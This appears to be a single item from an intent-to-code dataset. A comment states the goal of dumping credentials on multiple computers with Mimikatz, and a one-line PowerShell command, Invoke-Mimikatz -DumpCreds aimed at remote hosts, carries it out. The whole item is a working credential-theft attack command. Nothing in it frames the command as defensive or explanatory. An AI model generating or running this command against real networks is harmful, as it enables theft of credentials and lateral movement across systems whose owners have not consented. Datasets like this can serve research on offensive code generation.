# Natural language intent:
# Invoke Mimikatz to dump credentials on multiple computers.

Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2)
